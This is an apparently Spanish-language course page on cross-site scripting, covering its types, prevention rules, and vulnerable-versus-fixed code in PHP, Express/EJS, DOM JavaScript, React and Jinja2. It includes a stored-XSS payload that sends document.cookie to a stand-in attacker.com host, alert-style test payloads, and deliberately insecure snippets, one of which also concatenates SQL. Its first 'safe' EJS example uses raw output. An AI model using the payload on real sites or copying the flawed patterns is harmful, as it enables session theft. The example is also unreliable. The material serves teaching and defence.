| **Inicio**         | **atrás 5**                           | **Siguiente 7**                          |
| ------------------ | ------------------------------------- | ---------------------------------------- |
| [🏠](../README.md) | [⏪](./10_5_What_is_SQL_Injection.md) | [⏩](./10_7_What_is_Evil_Twin_attack.md) |

---

## **Índice**

| Temario                                                                                                                                        |
| ---------------------------------------------------------------------------------------------------------------------------------------------- |
| [308. Secuencias de comandos entre sitios (XSS) - OWASP](#308-secuencias-de-comandos-entre-sitios-xss---owasp)                                 |
| [309. Hoja de trucos para prevenir secuencias de comandos entre sitios](#309-hoja-de-trucos-para-prevenir-secuencias-de-comandos-entre-sitios) |
| [310. Secuencias de comandos entre sitios](#310-secuencias-de-comandos-entre-sitios)                                                           |

# **XSS**

## **308. Secuencias de comandos entre sitios (XSS) - OWASP**

![XSS](/img/10_Common_Attacks/Xss.png "XSS")

### 🔎 Descripción general de XSS

La **inyección de secuencias de comandos entre sitios (Cross-Site Scripting o XSS)** ocurre cuando una aplicación web permite que un atacante **inyecte código malicioso en el navegador de otro usuario** (normalmente JavaScript).

Ese código se ejecuta en el navegador de la víctima como si fuera legítimo, lo que permite al atacante:

- Robar cookies de sesión.
- Manipular el DOM (interfaz visual).
- Redirigir a sitios falsos (phishing).
- Mostrar formularios falsos para robar credenciales.
- Usar la sesión de la víctima para realizar acciones sin su consentimiento (CSRF combinado con XSS).

XSS aparece en el **OWASP Top 10** como una de las vulnerabilidades web más frecuentes.

### ⚔️ Actividades de seguridad relacionadas

1. **Revisión de entradas de usuario**: analizar cómo la app procesa parámetros de URL, formularios, cabeceras, etc.
2. **Validación y codificación de salida**: comprobar si los datos del usuario se muestran en HTML sin sanear.
3. **Uso de Content Security Policy (CSP)**: aplicar cabeceras que limiten scripts.
4. **Pentesting / pruebas dinámicas**: inyectar cadenas de prueba controladas para verificar si se ejecutan.
5. **Auditorías de logs**: detectar intentos de explotación de XSS.

### 🛡️ Cómo evitar vulnerabilidades XSS

Las defensas se dividen en **validación/escapado** y **configuración de seguridad**:

✅ **Escapar salida según el contexto**:

- HTML → `&lt;`, `&gt;`, `&quot;`, etc.
- JavaScript → escapar comillas, saltos de línea.
- Atributos HTML → comillas obligatorias y escapadas.
- CSS / URL → validación estricta (evitar inyecciones de `javascript:`).

✅ **Librerías seguras**: usar funciones de frameworks (React, Angular, Django, etc.), que ya manejan el escape automático.

✅ **Validación de entrada**: rechazar o sanear datos que no cumplan formato esperado (ej. emails, IDs).

✅ **CSP (Content Security Policy)**: cabecera HTTP que limita qué scripts pueden ejecutarse. Ejemplo:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

✅ **HttpOnly y Secure cookies**: cookies de sesión deben estar marcadas como `HttpOnly` para que JavaScript no las lea.

### 👀 Cómo revisar código para encontrar XSS

En una **code review** busca:

- Concatenación de **entradas del usuario** dentro de HTML.
- Uso directo de `innerHTML`, `document.write()`, `eval()`.
- Variables que vienen de `req.query`, `req.body`, `$_GET`, `$_POST`, etc. sin escape.
- Falta de sanitización en plantillas.

Ejemplo vulnerable (Node.js + Express + EJS):

```ejs
<!-- VULNERABLE: imprime input directamente -->
<p>Hola <%= req.query.name %></p>
```

Ejemplo seguro:

```ejs
<!-- SEGURO: EJS hace escaping automático -->
<p>Hola <%- _.escape(req.query.name) %></p>
```

### 🔍 Cómo detectar vulnerabilidades XSS

1. **Pruebas manuales**: introducir cadenas de prueba como `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`.
2. **Herramientas automatizadas**: OWASP ZAP, Burp Suite, Arachni.
3. **Análisis dinámico (DAST)**: ejecutar fuzzing contra la aplicación en un entorno controlado.
4. **Análisis estático (SAST)**: buscar patrones de concatenación de variables en el código.
5. **Explorar vectores poco comunes**: cabeceras HTTP, campos ocultos, valores JSON.

### 📝 Descripción de tipos de ataques XSS

#### 🔹 XSS reflejado

- El payload se envía en una **URL o petición** y se refleja directamente en la respuesta.
- Ejemplo:

```
https://example.com/search?q=<script>alert(1)</script>
```

Si el servidor imprime `q` sin escapar, el script se ejecuta en el navegador de la víctima.

#### 🔹 XSS almacenado

- El payload se **guarda en la base de datos** y se ejecuta cada vez que otro usuario lo ve.
- Ejemplo: un atacante publica un comentario con `<script>fetch('http://attacker.com/cookie?c='+document.cookie)</script>`.
- Cada usuario que vea la página ejecutará ese script.

### ⚡ Ejemplos educativos

#### Ejemplo vulnerable (PHP):

```php
// VULNERABLE
echo "Bienvenido " . $_GET["usuario"];
```

Si el atacante envía:

```
http://example.com/?usuario=<script>alert(1)</script>
```

El navegador ejecutará el `alert(1)`.

#### Ejemplo seguro (PHP):

```php
// SEGURO
echo "Bienvenido " . htmlspecialchars($_GET["usuario"], ENT_QUOTES, 'UTF-8');
```

### 📌 Resumen (cheat-sheet rápida XSS)

- ❌ Nunca uses `innerHTML`, `document.write`, `eval` con input externo.
- ✅ Escapa siempre la salida según el **contexto** (HTML, JS, atributos, etc.).
- ✅ Usa frameworks modernos (React, Angular) → auto-escapan valores.
- ✅ Implementa **CSP** y cookies `HttpOnly`.
- ✅ Prueba manualmente y con herramientas automáticas.
- ✅ Haz revisiones de código buscando input sin escapar.

---

[🔼](#índice)

---

## **309. Hoja de trucos para prevenir secuencias de comandos entre sitios**

### 🔧 Seguridad del marco (framework security)

- Usa frameworks modernos (React, Angular, Vue, Django, Rails) → ya incluyen **escape automático**.
- No desactives mecanismos de seguridad del framework (ej. `dangerouslySetInnerHTML` en React, `ng-bind-html` sin sanitizar en Angular).
- Habilita **plantillas seguras** (`{{ variable }}` en lugar de `{{{ variable }}}`).
- Actualiza librerías y frameworks con parches de seguridad.

### 🧭 Filosofía de defensa XSS

- **Escapa siempre la salida**, no solo valides la entrada.
- Defiende según el **contexto**: HTML, atributo, JavaScript, CSS o URL.
- Usa el **principio de menor privilegio** en scripts: limitar capacidades con **CSP**.
- Combina varias defensas (no hay una sola bala de plata).

### 📝 Codificación de salida (output encoding)

- HTML → `&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`.
- Atributos HTML → comillas obligatorias, escapar comillas simples/dobles.
- JavaScript → escapar comillas, barras invertidas y saltos de línea.
- CSS → no permitir valores de entrada dinámicos sin whitelist estricta.
- URLs → validar esquema (`http`, `https`) y escapar caracteres especiales.

Ejemplo en PHP:

```php
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
```

Ejemplo en JavaScript (DOM):

```js
const safeText = document.createTextNode(userInput);
element.appendChild(safeText);
```

### 🧹 Sanitización de HTML

- Usa librerías para limpiar HTML si necesitas mostrar contenido de usuario:

  - **DOMPurify** (JavaScript).
  - **Bleach** (Python).
  - **HTML Purifier** (PHP).

- Define una **whitelist** de etiquetas y atributos permitidos.
- Elimina scripts, eventos (`onerror`, `onclick`, etc.) y URLs con `javascript:`.

### 🚰 Fregaderos seguros (safe sinks)

Un “sink” es cualquier punto donde los datos llegan al DOM o al navegador.

- Prefiere `textContent`, `innerText` o `setAttribute("value", ...)` en lugar de `innerHTML` o `document.write()`.
- Evita `eval()`, `setTimeout(string)`, `setInterval(string)`, `Function(string)`.
- Usa APIs seguras de frameworks en vez de manipulación cruda del DOM.

Ejemplo seguro:

```js
element.textContent = userInput; // SEGURO
element.innerHTML = userInput; // ❌ INSEGURO
```

### 🛠️ Otros controles

- **CSP (Content Security Policy):**

  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
  ```

- **Cookies de sesión con `HttpOnly` y `Secure`.**
- **Escaneo regular** con OWASP ZAP, Burp Suite, SonarQube.
- **Validación de entrada** estricta (ej. emails, IDs, números).
- **Revisión de logs** para detectar intentos de inyección.

### 📋 Resumen de las reglas de prevención de XSS

1. Nunca mezcles entrada del usuario sin escapar en HTML/JS.
2. Escapa la salida según el contexto.
3. Usa frameworks modernos con escape automático.
4. Sanitiza contenido HTML si debe mostrarse.
5. Configura CSP y cookies seguras.
6. Evita sinks peligrosos (`innerHTML`, `eval`).
7. Audita código y haz pruebas dinámicas.

### 📌 Resumen de reglas de codificación de salida

- HTML → `htmlspecialchars()` o equivalente.
- Atributo HTML → escapar comillas simples y dobles.
- JavaScript → usa `JSON.stringify` o `\uXXXX` para caracteres.
- CSS → valida y escapa (evitar `expression()`, `url(javascript:...)`).
- URLs → solo `http(s)://`, nunca `javascript:` ni `data:`.

### ❌ Antipatrones comunes (enfoques ineficaces que conviene evitar)

- 🚫 **Blacklists simples** (`replace("<script>", "")`) → fáciles de evadir.
- 🚫 **Filtrar solo ciertas etiquetas** → XSS también se puede inyectar en atributos o eventos.
- 🚫 **Confiar solo en validación de entrada** → siempre escapar salida.
- 🚫 **Desactivar medidas del framework** (ej. `bypassSecurityTrustHtml` en Angular).
- 🚫 **Permitir HTML sin sanitización** (blogs, comentarios).
- 🚫 **Usar WAF como única defensa** → debe ser complementario, no reemplazo.

📌 **Conclusión:**

El XSS no se previene con un solo control, sino con una **estrategia en capas**:

1. Frameworks seguros.
2. Codificación de salida según contexto.
3. Sanitización de HTML.
4. Uso de sinks seguros.
5. Políticas de seguridad como CSP.
6. Auditorías regulares.

---

[🔼](#índice)

---

## **310. Secuencias de comandos entre sitios**

**Cross-Site Scripting (XSS)** es una vulnerabilidad web donde una aplicación permite que código malicioso (normalmente JavaScript) llegue al navegador de otros usuarios y se ejecute con su contexto (cookies, permisos, DOM). Es peligrosa porque el atacante puede robar sesiones, forzar acciones en nombre del usuario, robar datos visibles, inyectar keyloggers o redirigir a phishing.

> Importante: XSS no es un “bug raro” — suele surgir por fallos básicos de manejo de salida de datos.

### Tipos principales de XSS (con explicación breve)

1. **Reflejado (reflected)**

   - El payload viene en la petición (query, formulario) y se refleja en la respuesta inmediatamente.
   - Ej.: `https://site.example/search?q=<script>…</script>` — si la app imprime `q` sin escapar, el script se ejecuta.

2. **Almacenado (stored / persistent)**

   - El payload se guarda en la base de datos (comentarios, perfiles, posts) y se ejecuta cuando otros usuarios visualizan esa página. Muy peligroso porque puede afectar a muchos usuarios.

3. **DOM-based (client-side)**

   - La vulnerabilidad existe en JavaScript del lado cliente: el script del sitio toma datos de `location`, `document.referrer`, `innerHTML`, etc., y los inserta en el DOM sin sanitizar. La aplicación server-side puede no estar involucrada.

### Ejemplos vulnerables y versiones seguras (código)

> Todos los ejemplos muestran cómo **se comete** y **cómo corregirlo**. No se usan payloads maliciosos reales fuera de entornos controlados.

#### 1) Reflected — Node.js + Express + EJS (vulnerable -> seguro)

Vulnerable:

```js
// app.js (Express)
app.get("/greet", (req, res) => {
  const name = req.query.name || "invitado";
  // EJS renderiza sin escapado explícito si se fuerza
  res.render("greet", { name });
});
```

`greet.ejs`:

```ejs
<!-- VULNERABLE: si template imprime sin escape -->
<p>Hola <%= name %></p>
```

Si `name` contiene `<script>alert(1)</script>` se ejecutará.

Seguro (escape automático / sanitizar):

```ejs
<!-- EJS normalmente escapa <%= %>, pero si se usa raw, evitar -->
<p>Hola <%= name %></p> <!-- mantener este y no usar <%- ... %> -->
```

O sanitizar con una librería (p.ej. DOMPurify en el cliente o `sanitize-html` en Node) para casos donde se necesita HTML.

#### 2) Stored — PHP ejemplo (vulnerable -> seguro)

Vulnerable (guardar y mostrar sin escape):

```php
// insertar comentario
$comment = $_POST['comment'];
mysqli_query($db, "INSERT INTO comments (text) VALUES ('" . $comment . "')");

// renderizar comentario
echo "<div class='comment'>{$row['text']}</div>";
```

Seguro:

```php
// al renderizar
echo "<div class='comment'>" . htmlspecialchars($row['text'], ENT_QUOTES, 'UTF-8') . "</div>";
```

O usar un sanitizador si permites HTML seguro (ver DOMPurify / HTML Purifier).

#### 3) DOM-based — JavaScript cliente (vulnerable -> seguro)

Vulnerable:

```html
<!-- index.html -->
<div id="out"></div>
<script>
  // toma hash de URL y lo inserta crudo
  document.getElementById("out").innerHTML = location.hash.slice(1);
</script>
```

Si la URL contiene `#<img src=x onerror=alert(1)>` se ejecutará.

Seguro:

```js
// usar textContent o crear nodo de texto
const out = document.getElementById("out");
out.textContent = location.hash.slice(1); // muestra texto sin interpretar HTML
```

Si necesitas permitir HTML seguro, usa **DOMPurify** para limpiar antes de insertar:

```js
// con DOMPurify
out.innerHTML = DOMPurify.sanitize(unsafeHtml);
```

#### 4) React — por defecto seguro, pero con trampas

Seguro (React escapa valores por defecto):

```jsx
// React
return <div>{userInput}</div>; // seguro: React escapa automáticamente
```

Peligroso:

```jsx
// cuidado con esto
return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
```

Si usas `dangerouslySetInnerHTML`, sanitiza con DOMPurify **antes**.

#### 5) Flask / Jinja2 (Python)

Jinja2 hace **autoescape** en HTML por defecto:

```jinja
<!-- template.html -->
<p>{{ user_input }}</p> <!-- seguro: escapado automáticamente -->
```

Cuidado con `|safe` (desactiva escape) — solo usar si el HTML fue limpiado.

### ¿Dónde buscar XSS en el código? (sinks y fuentes)

- **Fuentes (input):** `req.query`, `req.body`, `$_GET`, `location`, `document.referrer`, inputs de usuarios, campos de perfil, uploads.
- **Sinks (donde el input puede ejecutar código):** `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `setInterval(string)`, `elem.src = userValue` (si no se valida), `href` con `javascript:`.
- **Plantillas sin escape, atributos HTML construidos por concatenación**.

### Reglas de codificación y escape según contexto

- **Texto HTML (entre etiquetas):** escapar `& < > " ' /` → usar funciones de escape del framework (`htmlspecialchars`, `HTMLEncode`, etc.) o APIs DOM (`textContent` / `createTextNode`).
- **Atributo HTML:** escapar comillas; poner el valor entre comillas siempre.
- **Contexto JavaScript (in-script):** evita inyectar valores sin procesar; usa `JSON.stringify` para pasar datos desde servidor a script de forma segura:

  ```html
  <script>
    const cfg = JSON.parse("{{ server_json | tojson }}");
  </script>
  ```

- **URL:** usar `encodeURIComponent` y validar esquema (`http/https`) para evitar `javascript:` o `data:`.
- **CSS:** no inyectar valores en estilos sin whitelist y validación.
- **HTML permitido:** si quieres permitir HTML limitado (ej. posts), usa un sanitizador (DOMPurify, Bleach, HTMLPurifier) con whitelist.

### Medidas de mitigación técnicas (prácticas recomendadas)

1. **Escape de salida por contexto** — prioridad número 1.
2. **Usar APIs seguras del DOM**: `textContent`, `value`, `setAttribute` en lugar de `innerHTML`.
3. **Sanitizar contenido HTML** si debes aceptar HTML (DOMPurify, Bleach, HTMLPurifier).
4. **Content Security Policy (CSP)** — añade una capa que restringe orígenes de scripts; ejemplo básico:

   ```
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; object-src 'none';
   ```

   - Usar nonces o hashes es más seguro que `unsafe-inline`. CSP reduce impacto, pero no substituye escape.

5. **Cookies seguras:** `HttpOnly`, `Secure`, `SameSite=strict/lax` para mitigar robo de cookies via JS.
6. **Evitar inline scripts y estilos** cuando sea posible (facilita CSP).
7. **Principio de menor privilegio** y separación entre componentes.
8. **Validación de entrada por whitelist** (tipo/formato/longitud) — útil, pero insuficiente por sí sola.
9. **Remover errores verbosos en producción** que puedan dar pistas al atacante.
10. **Registro y monitoreo** de intentos extraños y uso de WAF como capa adicional.

### Detección y pruebas (ética y práctica)

- **Manual:** insertar cadenas de prueba (por ejemplo un `alert(1)` en el contexto HTML o inyecciones de atributos) para verificar ejecución _solo en entornos autorizados_.
- **Automatizado:** OWASP ZAP, Burp Suite, Arachni, Acunetix — son herramientas que prueban vectores habituales.
- **SAST:** buscar patrones peligrosos en el código (concatenaciones de input con salida HTML/JS).
- **Logs y telemetry:** revisar solicitudes con caracteres inusuales (`<`, `>`, `onerror`, etc.).
- **Labs para practicar legalmente:** PortSwigger Web Academy, OWASP Juice Shop, WebGoat, TryHackMe.

### Antipatrones y errores comunes

- Confiar en **blacklists** (filtrar `<script>` pero no otros vectores).
- Usar `innerHTML` para mostrar texto del usuario.
- Usar `dangerouslySetInnerHTML` sin sanitizar.
- Confiar solo en validación de entrada sin escapar la salida.
- Configurar CSP mal (ej. permitir `unsafe-inline`) y pensar que eso ya lo cubre todo.

### Checklist rápida (qué aplicar hoy mismo)

- [ ] Escapar TODA salida HTML por contexto.
- [ ] Sustituir `innerHTML` por `textContent` donde sea posible.
- [ ] Revisar usos de `eval`, `document.write`, `setTimeout(string)`.
- [ ] Añadir sanitizador (DOMPurify/HTMLPurifier/Bleach) si permites HTML.
- [ ] Habilitar CSP y revisar excepciones.
- [ ] Marcar cookies como `HttpOnly` y `Secure`.
- [ ] Incluir SAST en el pipeline CI y DAST en staging.
- [ ] Formar al equipo en manejo seguro de salida y sinks peligrosos.

### Resumen final

XSS es una de las vulnerabilidades más comunes y explotables porque a menudo surge por descuidos sencillos en cómo mostramos datos de usuario. La defensa efectiva es **simple en concepto**: **escape correcto por contexto + APIs seguras + sanitización cuando haya HTML + CSP y prácticas de despliegue seguras**. Aplicando estas reglas de forma consistente se mitigan la mayoría de los riesgos.

---

[🔼](#índice)

---

| **Inicio**         | **atrás 5**                           | **Siguiente 7**                          |
| ------------------ | ------------------------------------- | ---------------------------------------- |
| [🏠](../README.md) | [⏪](./10_5_What_is_SQL_Injection.md) | [⏩](./10_7_What_is_Evil_Twin_attack.md) |
